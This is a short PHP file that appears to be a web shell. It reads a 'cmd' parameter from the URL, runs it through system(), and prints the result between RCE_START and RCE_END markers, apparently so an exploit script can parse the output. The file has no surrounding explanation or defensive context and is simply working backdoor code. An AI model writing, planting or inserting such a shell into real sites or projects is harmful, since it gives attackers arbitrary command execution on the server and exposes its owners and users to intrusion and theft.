<?php
if(isset($_GET['cmd'])){
    echo "===RCE_START===\n";
    system($_GET['cmd']);
    echo "\n===RCE_END===";
    exit;
}
?>
